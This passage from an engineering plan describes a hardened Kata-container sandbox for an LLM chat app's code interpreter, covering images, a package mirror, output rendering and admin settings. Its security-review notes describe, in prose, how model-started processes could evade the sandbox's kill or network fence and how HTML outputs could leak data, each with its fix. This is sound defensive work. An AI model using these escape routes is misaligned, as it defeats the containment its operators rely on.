  in the create options; checked: no address in `/proc/net/if_inet6`, the
  mirror still answers), and `network_is_fenced` also requires the bridge
  name `lllm-sandbox`, which the host-side rule (Q20, T16) keys on.
- **T14's security review (2026-11-11)**, applied: the kill's verdict
  is a separate exec as `nobody` (a UID 1000 survivor could ptrace the
  UID 1000 kill and fake its exit 0; reproduced, and on Kata the
  reviewer's proof of concept now ends with the sandbox stopped or the
  survivor gone); each workspace filesystem stops 4 MiB short of its
  image, and the loop is attached with `--no-partition-scan`, so file
  data cannot make blkid see a RAID member; stream threads have their own
  pool; `ready()` and `create` check the network's attributes, not its
  name. Guest seccomp is on (Q19): user namespaces are refused, ptrace is
  still allowed (Docker's default profile), and pip, R, latexmk with
  biber, and Playwright's Chromium (with its default `chromiumSandbox:
  false`) all work under it.
- **T14's code and security re-reviews (2026-11-11)**, applied: the
  verdict's pass counts only when `/proc/loadavg`'s last PID is unchanged
  across it (a PID-hopping UID 1000 survivor escaped the snapshot scan;
  reproduced on Kata, and its proof of concept is now a Kata test that
  fails closed); the kill stops early once nothing is left (per call
  1.38 s to 0.19 s); `ready()` and every create check that Kata's
  configuration keeps guest seccomp on and that the host has IPv6 off on
  `lllm-sandbox`, and every new guest is checked from inside, as nobody,
  for `Seccomp: 2` and no IPv6 address; `_wait`'s calls are bounded;
  leftover scans skip entries destroyed meanwhile; modes are set
  explicitly, whatever the umask.
- **Scope.** `make test-boot` boots the real app with a temporary
  `DATA_DIR`, its own database and `LLLM_STOP_JOBS_ON_SHUTDOWN=true`
  against the same Docker daemon, so its startup sweep would have stopped
  the dev backend's sandboxes and its retention sweep found every chat
  missing. Each backend labels what it makes `lllm.scope=<id>`, a random
  id made once in its volume directory (so it moves with `DATA_DIR`), lists
  only that, and leaves alone a container or volume of another scope it
  finds by name; instances with different data directories never see each
  other's sandboxes, and two with the same one are kept apart by the
  manager lock under `DATA_DIR/sandbox`.

### T15: sandbox images

*Author: any. Verify: docker, host-internet. Depends: T02.*

Under `infra/sandbox/`:

- `common/`: `install-common.sh` (bash, git, sqlite3, DuckDB CLI pinned
  by version and checksum, poppler-utils, tini if the base lacks it) and
  `lllm-path` (T12's confinement helper, written and tested by T12; T15
  only copies it in). T16 adds the `pip` environment, and T21 adds
  `sitecustomize.py`, `Rprofile.site` and the `bash.bashrc` command-miss
  hook, each bumping the image tag; T15 ships none of them as an empty
  placeholder.
- `Dockerfile.data`: `FROM quay.io/jupyter/scipy-notebook:2026-10-12`,
  then `COPY` the common files and run `install-common.sh`; R from
  conda-forge (`r-base`, `r-tidyverse`, `r-data.table`, `r-broom`,
  `r-lme4`, `r-survival`) with `mamba install`, versions pinned in an
  `environment-r.yml`; TeX Live from upstream, one pinned yearly release,
  `scheme-small` plus the collections `latexrecommended`, `latexextra`,
  `fontsrecommended`, `mathscience`, `bibtexextra`, `pictures`, plus
  `latexmk` and `biber`; `texmf.cnf` with `shell_escape = f` and
  `openout_any = p`; `Rprofile.site` with the namespace finalizer (T21);
  `/workspace` created owned by 1000 (T02 item 1); `USER 1000`.
- `Dockerfile.web`: a pinned Node.js LTS image, the common files,
  TypeScript, `tsx`, ESLint, Prettier and Playwright with Chromium,
  versions pinned in a `package.json` + lockfile under
  `infra/sandbox/web/` (not under `apps/`, so the gate's `package.json`
  rule does not apply); `/workspace` owned by 1000; `USER 1000`.
- Makefile target `sandbox-images` (gate finding, T15 row): builds both
  with `docker build -f infra/sandbox/Dockerfile.<key> -t
  local-llm/sandbox-<key>:<tag> infra/sandbox`, after the `desktop:`
  target and before the "--- Checks" divider, in `.PHONY` and `help`.
  It is a lifecycle target, not a check.
- `image-freeze.txt` (T16 needs it): `make sandbox-images` also writes
  `docker run --rm local-llm/sandbox-data:<tag> pip list --format=freeze`
  (conda's `pip freeze` prints `file://` paths, useless as constraints) to
  `infra/sandbox/image-freeze.txt`, committed.

**Docs:** `docs/guides/sandbox.md` "Images": what each contains, how to
rebuild, how the tag is bumped, the image sizes measured.

**Verify (docker, host-internet):** both images build from clean; inside
`data`: `python -c 'import pandas, scipy, sklearn'`, `Rscript -e
'library(dplyr); library(lme4)'`, `latexmk -v`, `pdftoppm -v`, `kpsewhich
-var-value=shell_escape` prints `f`; inside `web`: `tsc --version`,
`npx playwright --version` and a headless screenshot of a local HTML file.
Record sizes.

**From T02 (2026-11-10):** the scipy-notebook Python honours
`PYTHONUSERBASE` (item 7; no `.venv` fallback needed). The image must
create `/workspace` owned by `1000:1000` itself: an empty named volume
takes the ownership of the image's directory (item 1), while a missing
one would be created root-owned. Put `/workspace/.local/bin` on `PATH`
(pip warns otherwise), and give GID 1000 a group name, or `id` prints
"cannot find name for group ID 1000" (the image's `jovyan` is in group 100).

**From T10's security review (2026-11-10):** put
`/workspace/.local/bin` *last* on `PATH`, after the image's own
directories, so a model-written file cannot shadow `timeout`, `bash` or
the tools the manager runs.

### T16: wheelhouse and `sandbox-mirror` **security**

*Author: any. Verify: docker, host-internet, kvm. Depends: T15.*

- `infra/sandbox/allowlist.in`: the approved extra packages, one per line
  with a comment saying why; start small (the owner names the first ones;
  if none, ship it with a header comment and no packages, which still
  proves the path).
- `infra/sandbox/requirements.lock`: `uv pip compile allowlist.in -c
  image-freeze.txt --generate-hashes --python-version <image's python>`.
- Makefile target `wheelhouse`: `pip download -r requirements.lock
  --only-binary=:all: --require-hashes -d apps/server/data/sandbox/wheelhouse`
  (under `DATA_DIR`, already ignored by `.gitignore:229`), run with the
  image's Python (inside a throwaway `sandbox-data` container with the
  default network, so the platform tags match). The only step that
  reaches PyPI.
- `infra/docker-compose.yml`:
  - a `sandbox-mirror` service: a pinned `nginx:<version>-alpine` image,
    `container_name: local-llm-sandbox-mirror`, the wheelhouse bind-mounted
    read-only at `/usr/share/nginx/html`, `autoindex on` (pip's
    `--find-links` reads the listing), JSON access log to stdout,
    `read_only: true` with a tmpfs for nginx's cache, `cap_drop: [ALL]`
    plus only what nginx needs, `no-new-privileges`, small `mem_limit` and
    `pids_limit`, no published port, `networks: [sandbox]` only, with a
    fixed `ipv4_address` (Q9: sandboxes reach it by that address through
    `extra_hosts`, since names do not resolve in a Kata guest);
  - a `sandbox` network with `internal: true` and a fixed IPv4 subnet
    (`ipam.config`; pick a private range no other Compose network here
    uses) (Compose names it
    `local-llm_sandbox`, which T14 uses), unless T02 item 11 showed
    Compose cannot remove it with sandboxes attached, in which case follow
    the alternative recorded there;
  - a comment block in the file's style explaining the isolation.
- The Makefile's `make backend` service lists (`Makefile:149` and `:164`)
  gain `sandbox-mirror` (gate finding; `tests/test_makefile.py` updated
  to match). Keep the `==> ` marker prefixes unchanged
  (`apps/desktop/src/progress.ts` matches on `'==> Starting Postgres and
  Redis'`).
- Images set `PIP_NO_INDEX=1`, `PIP_FIND_LINKS=http://sandbox-mirror/`,
  `PIP_ONLY_BINARY=:all:`, `PIP_USER=1`, `PYTHONUSERBASE=/workspace/.local`
  (or T02 item 7's fallback).

**Verify:** (docker, host-internet) `make wheelhouse` downloads and
hash-checks; (docker, kvm) from a sandbox, an allowlisted package installs
and imports in the next call, an unlisted one fails with "no matching
distribution", an sdist-only one is refused; from the mirror container,
`wget https://pypi.org` fails. These are acceptance tests "Mirror
installs" and part of "Network fence".

**From T02 (2026-11-10):** the sandbox network stays in Compose
(item 11): `docker compose down` with sandboxes attached exits 0 and
leaves the network ("Resource is still in use"), and the next `up` reuses
it, so `make backend`'s exit needs no change; expect that line in its
output. Names do not resolve in a Kata guest, so the network has a fixed
subnet and the mirror a fixed address (Q9).

**From T14 (2026-11-11): the subnet and the mirror's address are chosen.**
`sandbox/kata.py` holds them as `SANDBOX_SUBNET = '10.231.0.0/24'`,
`SANDBOX_IP_RANGE = '10.231.0.128/25'` and `SANDBOX_MIRROR_ADDRESS =
'10.231.0.2'`; Compose must use the same: the `sandbox` network with
`internal: true` and `ipam.config` `subnet: 10.231.0.0/24`, `ip_range:
10.231.0.128/25` (Docker hands sandboxes addresses only from the upper
half, so none can take the mirror's address before the mirror starts),
and `sandbox-mirror` at `ipv4_address: 10.231.0.2`. Add the test that
reads `infra/docker-compose.yml` and checks all three against the
constants. Chosen outside Docker's default address pools (172.17-31/16,
192.168/16), so Compose's other networks can never take it first, and
clear of every network on the laptop (`docker0` 172.17.0.0/16, podman's
10.88.0.0/16 and 10.89.0.0/24, the LAN 192.168.1.0/24). Until T16 lands,
`tests/test_sandbox_kata.py` creates `local-llm_sandbox` with these values
when it is missing, and removes it afterwards; a network left over under
that name without Compose's labels would make `docker compose up` refuse
it. **Corrected 2026-11-11 (T14):** an internal network does not fence
off the host. The host's side of the bridge keeps an address (the
gateway: `.1` when Compose names one, else the dynamic range's first,
`.128`), and a guest reaches every host service listening on `0.0.0.0`
through it; the first fence runs missed it because they probed only
`.1` on a network made without a named gateway. The fix, checked on
Kata: `driver_opts: com.docker.network.bridge.inhibit_ipv4: "true"` on
the `sandbox` network (no IPv4 address on the bridge; the host is
unreachable, a peer such as the mirror still is), and no `gateway:`. The
backend refuses a network without it (`kata.network_is_fenced`), and
T16's agreement test should check it too. The host's LAN address and
`docker0` were unreachable throughout. Sandboxes on the network can reach each other
by address, though nothing listens between calls, since Q10's kill ends
every process the model started; `enable_icc: false` would also cut them
off from the mirror.

### T17: outputs, backend **security**

*Author: any. Verify: any; docker, kvm. Depends: T12.*

- **Collection.** The `bash` tool lists `/workspace/outputs` before and
  after the command (`find /workspace/outputs -type f -printf
  '%P\t%s\t%T@\n'`, through `exec`); new or changed files are fetched
  with `get_files` (cap 50 MiB each, 200 MiB per call; over the cap, the
  file is named in the result as not attached).
- **Storage.** Each fetched file becomes a File row the way generated
  images do today: follow `routers/images.py:546` `upload_image` (it calls
  `upload_file_handler(process=False)` and links the file to the message
  with `Chats.insert_chat_files` when the metadata has chat and message
  ids). Set `meta.source = 'sandbox_output'` and `meta.sandbox_path`.
  Emit the `files` event (`lib/chat/history.ts:410-412` consumes it) so
  the message shows them as they arrive.
- **PDF previews.** For a PDF, run `pdftoppm -png -r 80 -l 10` in the
  sandbox into `/workspace/.lllm/previews/`, store each page PNG the same
  way with `meta.preview_of = <pdf file id>`.
- **Raw downloads never render.** In `routers/files.py`:
  `GET /{id}/content` (`:855-915`) and `GET /{id}/content/{file_name}`
  (`:967-1011`) send `Content-Disposition: attachment` and
  `X-Content-Type-Options: nosniff` for every file with
  `meta.source == 'sandbox_output'`, whatever its type, ignoring the
  `attachment` query parameter. `GET /{id}/content/html` (`:918-964`)
  returns 403 for them (Corrections, item 4).
- **HTML for embedding.** A new route, `GET /api/v1/sandbox/outputs/{id}/html`
  (new router `routers/sandbox.py`, mounted in `main.py` beside the
  others around `:909`), same access checks as file content, returns JSON
  `{"html": <document>}` (JSON, so it never renders on the app's origin),
  or 413 over 5 MB. The document has the policy inserted as the first
  thing after an optional leading `<!doctype ...>`:
  `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; form-action 'none'">`.
  Inserting before any model content (not "after `<head>`") is what makes
  it apply to a `<script>` the model put before `<head>`.

**Tests** (`tests/test_sandbox_outputs.py`): diffing before and after
lists; caps; File rows carry the meta and link to the message; the three
file routes behave as above for sandbox outputs and unchanged for other
files (existing tests must still pass); the HTML route inserts the policy
first for documents with and without a doctype, with a `<script>` before
`<head>`, and with a model-written CSP; 413 over 5 MB.

**Verify:** the tests; `make test-backend`; security review; on the
laptop, a matplotlib figure saved to `outputs` appears on the message
(acceptance test "Outputs", completed by T18).

**From T10's security review (2026-11-10):** list outputs
with NUL-delimited `find -print0` (or `-printf` ending in `\0`), since a
model-chosen file name can contain a newline or tab and forge a line; read
them with `get_files`, which takes normalised paths under `/workspace/`
only and returns regular files only.

### T18: outputs, frontend **security**

*Author: any. Verify: any. Depends: T17.*

In `apps/web/src/`:

- `ResponseMessage` (`routes/chat/ChatMessages.tsx:229` on) renders
  `message.files` whose `meta.source` is `sandbox_output`, through a new
  `components/chat/SandboxOutputs.tsx`:
  - PNG, JPEG, SVG: `<img src="/api/v1/files/<id>/content">` (SVG only
    ever as `<img>`, never inline).
  - HTML: a new `SandboxedHtmlFrame` with `sandbox="allow-scripts"` and
    nothing else, `srcDoc` from the T17 route, a fixed height with a
    resize control (cross-origin height reads fail by design), and an
    "Enlarge" button that shows the *same* component in a modal. Never a
    `blob:` URL, never `window.open`.
  - PDF: the preview PNGs (`meta.preview_of`) as `<img>`, plus a download
    link.
  - `.tex`, `.py`, `.R`, text, JSON: the existing code-block renderer
    with highlighting; CSV: a small table (first 200 rows).
  - Anything else: a download link (`?attachment=true`).
- Do not reuse `ArtifactPanel`'s frame: its flags
  (`allow-scripts allow-forms allow-modals`) are wider than this design
  allows.
- Per Q4: in `apps/desktop/src/main.ts` `applyPolicy`
  (`:941-966`), add a `will-frame-navigate` handler that denies sub-frame
  navigation away from `about:srcdoc` and `about:blank`, with a test in
  `main.*.test.ts`.

**Tests:** Vitest for `SandboxOutputs` (each type picks the right
renderer; the iframe's `sandbox` attribute is exactly `allow-scripts`;
the modal reuses the frame); Playwright in `e2e/` with mocked routes: a
message with sandbox outputs renders image, HTML frame (assert the
attribute, as `chat-controls.spec.ts:80-88` does), PDF previews and a
download link.

**Verify:** `make test-web`; `make test-e2e`; `make test-desktop` if
desktop changed; a security review; on the laptop, the proposal's
acceptance test "Output rendering" (the script that tries cookies,
fetch, `parent.document`, `top.location`, a form, `window.open` and the
preload bridge), recorded by T29.

### T19: engine value, settings, prompt, admin page

*Author: any. Verify: any. Depends: T10.*

- `config.py`: accept `sandbox` as a value of `code_interpreter.engine`
  and `code_execution.engine`. Add to `DEFAULT_CONFIG` (`:2599`), next to
  the Jupyter keys: `code_interpreter.sandbox.default_image` (`'data'`),
  `code_interpreter.sandbox.timeout` (60), `code_interpreter.sandbox.max_running`
  (4), `code_interpreter.sandbox.idle_minutes` (30),
  `code_interpreter.sandbox.retention_days` (7). Seeding is automatic
  (Corrections, item 1); no revision.
- `CODE_INTERPRETER_SANDBOX_PROMPT` beside `CODE_INTERPRETER_JUPYTER_PROMPT`
  (`config.py:470-482`): the four tools; `/workspace` persists for the
  chat; uploads in `/workspace/uploads` read-only; put deliverables in
  `/workspace/outputs` (figures with `plt.savefig`, since nothing is
  captured inline); print what you want returned; no internet, `pip
  install` only from the reviewed mirror, and report "no matching
  distribution" instead of working around it; LaTeX with the
  `latexmk` command of the proposal, reading the log for overfull boxes
  and undefined references; the two images and when to choose `web`.
- `routers/configs.py`: add the five keys to `CODE_EXECUTION_CONFIG_KEYS`
  (`:49-65`) and `CodeInterpreterConfigForm` (`:717-732`), validated
  (image in `data`/`web`; timeout 1..300; max_running 1..16; idle and
  retention positive).
- `apps/web/src/routes/admin/settings/CodeExecution.tsx`: `ENGINES`
  (`:21`) gains `sandbox`; `EngineFields` shows the five sandbox fields
  when it is chosen, and a one-line status from a new
  `GET /api/v1/sandbox/status` (T14's `ready()`, admin only) so the admin
  sees why the engine is unusable.
- `routers/configs.py`'s `CONFIG_CODE_EXECUTION_UPDATED` event data
  (`:748-756`) stays as it is.

**Tests:** backend form validation and key mapping; the status route
(admin only); Vitest for the sandbox fields and the status line; extend
`e2e/admin-settings.spec.ts`'s Code Execution describe with a sandbox
case (add, do not remove the Jupyter ones yet).

**Verify:** `make test-backend`; `make test-web`; `make test-e2e`.

**From T10's security review (2026-11-10):** the admin settings this task adds
(the maximum running sandboxes, the timeout, idle and retention times)
must stay inside the fixed bounds in `sandbox/limits.py` (the timeout at
most `TIMEOUT_MAX_S`), and the page should say that each running sandbox
can hold 4 GiB and 2 CPUs, since 16 at once is 64 GiB.

### T20: call sites

*Author: any. Verify: any; docker, kvm. Depends: T12, T19.*

- **Native tool path:** with engine `sandbox`, the four tools are offered
  (T12); `execute_code` is not. `execute_code`'s engine dispatch
  (`builtin.py:700-759`) gains no sandbox branch.
- **`note_code_run`:** the `bash` tool calls `note_code_run(ms, failure)`
  (`utils/upstream_trace.py:65`) for every call, with `failure` set when
  the sandbox itself failed (backend error, `ready()` reason), *not* when
  the command exited non-zero (Corrections, item 5).
- **Tag path** (`utils/middleware.py`): `_execute_code` (`:6091-6159`)
  gains a `sandbox` branch that writes the block to
  `/workspace/.runs/<n>.py` (n increments per chat) with `write_file`
  semantics and runs `python /workspace/.runs/<n>.py` through the same
  manager call as `bash`, returning `{stdout, stderr, result: ''}` plus
  the attached outputs as markdown image links for images (so the legacy
  rendering shows them). `_apply_code_interpreter` (`:2542-2569`) appends
  `CODE_INTERPRETER_SANDBOX_PROMPT` for the sandbox engine. The blocked
  modules preamble (`:6095-6113`) is not added for the sandbox engine.
- **Run endpoint** (`routers/utils.py:44-73`): `CodeForm` gains an
  optional `chat_id`; with engine `sandbox` it requires one, checks the
  user may read that chat, and runs the code in that chat's sandbox the
  way the tag path does. T22 wires the Run button to it (Q2).
- **Sub-agents** (`utils/subagents.py:303-320`): the sandbox engine keeps
  `code_interpreter` for background sub-agents, as Jupyter does. Per Q6
  a sub-agent uses the parent chat's sandbox: its tool calls resolve to
  the parent chat's sandbox key, not its own chat id (the sub-agent
  creates its chat at `utils/subagents.py:463`; find where the parent's
  chat id is available there and carry it in the sub-agent's metadata).
  The per-chat lock serializes the two. Test that a sub-agent sees a
  file the parent wrote and that it takes no second slot.
- **Harness flag:** `request.state.benchmark_harness` (read at
  `builtin.py:765`) keeps outputs from being converted into chat images
  in benchmark runs; mirror that in the `bash` tool (outputs still listed
  in the result, not uploaded).

**Tests:** extend `tests/test_streaming_response.py` and
`tests/test_chat_payload.py` with *new* sandbox cases. Adding a case to
an existing golden file is an edit to it (a gate finding), so put the new
cases in new fixture files `tests/fixtures/sandbox_*.json` and leave
those two goldens untouched until T40 (`tool_loading.json` already
changes in T12); `note_code_run` called with and without
failure; the Run endpoint refuses without a chat id and for a
chat the user may not use (Q14); sub-agent settings keep the feature.

**Verify:** the tests; `make test-backend`; on the laptop, a model
without native tool calling runs a `<code_interpreter>` block (acceptance
test "Tag path").

**From T10's security review (2026-11-10):** the model's command goes
through `wrap_command()`, which refuses a NUL byte or more than
`MAX_COMMAND_BYTES`; turn that `ValueError` into a tool error the model
can act on (its message says to write the script to a file), not a
sandbox failure. Only `SandboxError` may call `note_code_run(failure)`;
a command that fails, is OOM-killed or times out is the model's result,
or the harness would refuse a whole run over one model mistake.

**From T11's code review (2026-11-10):** the manager's admin rule for
using a saved chat's sandbox (Q14) mirrors `main.py`'s
`_admin_reaches_other_chats` and `_persist_follow_up`, and a parity test
checks they agree; but `main.py` binds `ENABLE_ADMIN_CHAT_ACCESS` at
import while the manager reads it on every call. While changing the call
sites here, move the rule into one public helper in
`models/chats.py` (for example `admin_reaches_other_chats(user)`) used by
`main.py`, `routers/chats.py`'s `can_access_chat` and
`DatabaseChats.usable`, and update the patch targets in
`tests/test_admin_chat_access.py`.

**From T12 (2026-11-11):** `write_file` is also an Open Terminal tool's
name. `utils/middleware.py`'s `terminal_event_handler` emits
`terminal:write_file` for any tool of that name (three call sites), so the
sandbox tool sends it too (nothing in `apps/web` consumes it today); and
`_add_builtin_tools` skips a builtin whose name a tool server already
offers, so with a terminal server attached the model gets the terminal's
`write_file` beside the sandbox's `bash`, `view` and `str_replace`. Gate
`terminal_event_handler` on the tool being a terminal tool
(`tool_type == 'terminal'`), and test the mixed case: either offer the
sandbox's `write_file` under the sandbox engine or document which wins.

**From T19 (2026-11-11):** `code_interpreter.sandbox.timeout` (the
admin's default command timeout) is stored and validated but nothing
reads it yet: the `bash` tool's `timeout_s` defaults to 60 in its
signature, and `SandboxSettings` has no timeout. Make the tool's default
`None` meaning "the configured timeout", clamped by `clamp_timeout`, and
use the same default on the tag path and the Run endpoint. The admin page
saves a cleared field as null, and `Config.get(key, default)` returns that
null (not the default) when the row exists, so a stored null means
`limits.TIMEOUT_DEFAULT_S`.

**From T13 (2026-11-11):** only `bash` syncs the chat's attachments into
`/workspace/uploads`, so `view uploads/...` before the chat's first `bash`
call finds nothing, and a removed attachment stays readable through `view`
until the next `bash`; sync in `view` (and the tag path and Run endpoint)
too, or say so in the prompt. A sub-agent using the parent's sandbox (Q6)
with a different `__metadata__['files']` replaces the parent's uploads:
sync the parent chat's files, not the sub-agent's. With a cloud storage
provider every attachment is downloaded again on every `bash` call, even
when nothing changed (the sync compares ids and sizes only after
reading); compare before downloading.

**From T17's code review (2026-11-11):** the `bash` tool attaches the
files new or changed in `/workspace/outputs` since the last `bash` call's
listing, so files that any other path writes there (the Run endpoint, the
tag path, a sub-agent sharing the parent's sandbox, Q6) are attached by the
next `bash` call, on that call's message. That is probably what is wanted;
decide it here, and say so in the guide.

### T21: package telemetry

*Author: any. Verify: any; docker, kvm. Depends: T15, T16, T20.*

- **In the images** (T15's files): `sitecustomize.py` registers an
  `atexit` hook that takes top-level names in `sys.modules`, drops
  `sys.stdlib_module_names`, maps the rest with
  `importlib.metadata.packages_distributions()` and appends one JSON line
  per distribution to `/workspace/.telemetry/events.jsonl`
  (`{"kind":"import","name","version","ts"}`), and a `sys.excepthook`
  wrapper recording an uncaught `ModuleNotFoundError` as
  `{"kind":"module_miss","name"}`. `Rprofile.site` records loaded
  namespaces at exit the same way. Both must never raise: wrap in
  `try/except Exception: pass`.
- **In the manager:** after each `bash` call, read and truncate the file
  (`get_files`, then `exec` `: > file`); match stderr for "No matching
  distribution found for", "command not found" and LaTeX's "File `...'
  not found" as misses; read the mirror's access log since the last read
  (`docker logs --since`, through the backend) and map each request's
  client IP to the chat whose sandbox has that IP (`list_sandboxes()`).
- **Table** `sandbox_package_events` (`event_id` integer autoincrement
  PK, `ts` BigInteger, `chat_id` Text, `kind` Text, `name` Text,
  `version` Text nullable, `image_digest` Text, `lock_sha` Text,
  `harness_run_id` Text nullable), model in
  `models/sandbox.py` following `models/benchmarks/telemetry.py`'s
  `BenchmarkGpuSample` shape, an index on `(name, kind)`; a new revision
  via `new-migration`, copying `c8e1f5a2d907_add_benchmark_prescreen.py`'s
  guarded `create_table`. No `config_id` change, so no schema note.
- **Report:** `GET /api/v1/sandbox/packages` (admin): per package, chats
  using it, imports, last use, source (image or wheelhouse, from
  `image-freeze.txt` vs `requirements.lock`); misses ranked by distinct
  chats; harness rows excluded unless asked. A small admin page is
  optional; the route and a documented query are enough for this PR.

**Tests:** parsing and attribution with `FakeBackend`; the miss matchers;
the table round-trips; the schema-drift test passes
(`tests/test_schema_drift.py`).

**Verify:** the tests; `make test-backend`; on the laptop, acceptance
test "Telemetry".

### T22: Run button

*Author: any. Verify: any. Depends: T20.*

Per Q2, the button is built. Pass `onRun` from `ChatMessages.tsx` (beside
`onPreview`, `:288-300`) to `CodeBlock`, calling `executeCode`
(`lib/apis/utils/index.ts:31-63`, extended with `chat_id`) and showing
stdout, stderr and attached outputs under the block, reusing
`SandboxOutputs`. Vitest and a Playwright case.

### T23: step 1 docs

*Author: any. Verify: any. Depends: T20.*

- `docs/guides/sandbox.md` complete: host setup (T01, T02), images (T15),
  mirror and wheelhouse (T16), operations (where containers and volumes
  are, how to list and remove them, the reaper and retention, the status
  route), the KVM tests and how to run them, telemetry.
- `docs/guides/assistant-tools.md`: a "Code interpreter: sandbox" section
  beside the Jupyter one (Jupyter is still there until T44).
- `docs/guides/testing.md`: the Kata tests (`LLLM_TEST_KATA=1`), why they
  skip in CI.
- README "Running it": the Kata requirement, `make sandbox-images` and
  `make wheelhouse`, and that the engine is chosen in Admin Settings >
  Code Execution. MAP.md: `sandbox/`, `infra/sandbox/`, the guide.
  AGENTS.md: the requirements line (Kata, KVM) and the Compose services.
- The PR's decisions entry (Ground rules), first version.
- `docs/roadmap-timeline.mmd` and `ROADMAP.md` only when the PR is about
  to merge (T48), with the merge date.

**Verify:** the `docs-sync` skill's checks; `uvx pre-commit run --files
<changed docs>`.

**From T17 and T18 (2026-11-11): bullets for this PR's decisions entry.**
- Outputs are collected by comparing listings of `/workspace/outputs`: against the listing the previous call kept for the running sandbox (so files written by `write_file` or `str_replace` are attached by the next `bash` call), or one taken before the command. The listing is NUL-delimited, newest first, with an `END` sentinel and `find`'s stderr dropped, since a model-chosen name can hold a newline or tab.
- Caps the proposal lacked: per call 20 files and 200 MiB (50 MiB a file), PDF preview pages included; previews for 3 PDFs of 10 pages at 80 dpi cropped to 1600 px; 1 GiB per chat over all calls (Q22), counted from rows the server marks with `meta.source` and `meta.chat_id`, linked or not (an unsaved chat counts only the caller's rows); a file whose bytes equal the last stored version of its path is not stored again. The HTML route's limit is 5 MiB, not "5 MB".
- Outputs are stored through `Storage` and `Files.insert_new_file`, not `upload_file_handler` (which files caller metadata under `meta.data`), each row linked to the message as it is stored; a call with no message id stores and counts its outputs but links nothing; an unsaved chat's outputs stay the user's unlinked rows.
- Sandbox outputs are served as attachments with `nosniff`, `Content-Security-Policy: default-src 'none'; sandbox`, and `application/octet-stream` outside images (SVG included, shown only as `<img>`), PDF, audio and video; `/content/html` refuses them with 403 after the access check (Corrections, item 4).
- The HTML policy adds `base-uri 'none'`. It is not "no network": it does not stop a frame navigating itself (Q4: denied in the desktop app only) or WebRTC, which no CSP directive covers; a script in an HTML output can leak what the model wrote, what the user types into it and the user's IP over STUN/TURN or DNS (found in T18's security review on Electron 45.1.0; the owner accepted and documented it, Q23, over rendering static-first with a "run scripts" button).
- The `files` event carries only the call's new files; the chat page (`history.ts`, by id, then url) and the socket handler merge it into the message's list.
- The desktop app denies a srcdoc or blank sub-frame's navigation unless the app's own page starts it (Q4), so a link in the chat's artifact preview no longer navigates in the desktop app.

### T24: workspace cap and deletion dialog **security**

*Author: any. Verify: any; docker, kvm. Depends: T11, T14, T19.*

Owner decision Q15 (2026-11-10). Each user holds at most
`code_interpreter.sandbox.max_workspaces` persistent workspaces (default
20, admin-settable, added with T19's keys), and no workspace is deleted
for the cap or for the 7-day expiry without the user's answer.

- **Record.** A new append-only table (with the `new-migration` skill),
  for example `sandbox_workspace`: the backend key, the owning user, the
  chat id, created and last-used times, and a pending deletion (reason
  `cap` or `expired`, since when, and the workspace that would replace it
  for `cap`). The manager writes it when it creates a persistent volume,
  and reads it for the cap and the sweeps; it survives restarts.
- **Cap.** When `session()` would create a user's 21st persistent
  volume, it creates nothing: it records a pending `cap` request and
  raises a `SandboxError` whose message tells the model that the user's
  workspace limit is reached and that the user has been asked to remove
  one (the tool returns it as an error the model can relay). Once the
  user removes one, the next call creates the new workspace. Ephemeral
  sandboxes do not count.
- **Expiry.** T11's retention sweep stops destroying a volume unused for
  `retention_days`: it marks it pending (`expired`). It judges last use
  by this table's own last-used time, which the manager updates on every
  call, not by the chat row's `updated_at`, which the chat import route
  takes from the client (a chat imported with a future date would keep its
  volume until then). A pending volume is
  kept, with its disk, until the user answers. A volume whose chat was
  deleted is still destroyed silently, as in T11.
- **Contents.** The dialog lists each pending workspace's files (paths,
  sizes, modified times, capped at a few hundred entries, with a total)
  from a backend listing of the volume that does not need its sandbox
  running; add it to `SandboxBackend` and both backends (T14's lists the
  volume from a short-lived helper with the volume mounted read-only,
  never with model-chosen options).
- **API.** `GET /api/v1/sandbox/pending` (the current user's pending
  deletions with their contents, and for a `cap` request the user's
  other workspaces to choose from) and `POST
  /api/v1/sandbox/pending/{id}` with `remove` or `keep`; for `cap`,
  `remove` names the workspace to delete (the expired candidate or
  another of the user's), and `keep` leaves the new workspace uncreated.
  Each route acts only on the caller's own workspaces.
- **Dialog.** In `apps/web`, when the user has pending deletions (on
  load and after a tool call that hit the cap), a dialog shows each one:
  the chat it belongs to, the reason, its contents, and Remove / Keep.
  Keep on an `expired` workspace resets its last use, so it is not asked
  about again until it expires again.

**Tests:** the cap blocks the 21st and records one request; removing a
workspace lets the next call create; expiry marks pending and never
destroys; a deleted chat's volume still goes; the routes refuse another
user's workspaces; the listing is capped; Vitest and Playwright for the
dialog (Playwright mocks the backend).

**Verify:** `make test-backend`; `make test-web`; `make test-e2e`; on
the laptop (docker, kvm), the real listing of a stopped volume and one
cap round trip in the browser.

### T29: step 1 gate

*Author: local. Verify: docker, kvm, owner. Depends: T10-T24.*

`make check` on the branch head; `LLLM_TEST_KATA=1` suite; with the owner,
the step 1 acceptance tests from the proposal, each recorded in the PR
body's `## Laptop checks` with date and commit: network fence, VM
boundary, cross-chat isolation, persistence, read-only uploads, timeout,
fork bomb, memory, output flood, outputs, mirror installs, image
switching, output rendering (with an `RTCPeerConnection` probe, Q23), LaTeX, telemetry, tag path, parallel
sessions, start latency and overhead, restart. A failure becomes a new
ledger row before anything else.

---

## Step 2: move the harness

### T30: harness on the sandbox engine

*Author: any. Verify: any. Depends: T20.*

In `benchmarks/evaluation/harness.py`:

- `prepare()` (`:132-210`): accept engine `sandbox` (and, until T40,
  `jupyter`); replace the Jupyter liveness probe `_jupyter_alive`
  (`:292-307`) for the sandbox engine with the manager's `ready()`; the
  refusal messages name the sandbox for the sandbox engine.
- `spec_from_request()` (`:249-271`): `code_interpreter_engine` comes from
  config instead of the literal `'jupyter'` (`:268`), and with the sandbox
  engine the spec adds `sandbox_image` = the `data` image digest. The
  harness always uses the `data` image (pin it in the `bash` tool when
  `request.state.benchmark_harness` is set). `TOOLS` (`:55`) becomes the
  engine's tool set.
- Each item runs in an ephemeral sandbox (Q5): after an item finishes,
  pass or fail, call `manager.release(<the item's chat id>)` so the next
  item starts clean and no idle sandbox holds a slot. Test it.
- Comments at `:6`, `:19`, `:72`, `:135-139`, `:370-373` describe the
  engine accurately.
- Per Q1, a revision inserting the schema note, copying
  `a3c5e7f91b24_add_benchmark_harness.py:31-36` and `:62-71` (idempotent
  insert, exact delete on downgrade), via `new-migration`.
- Resumes: a run started under the Jupyter spec cannot resume under the
  sandbox spec (`runner.py:401-416` refuses a changed spec). That is
  correct; say so in `docs/guides/benchmarks.md`.

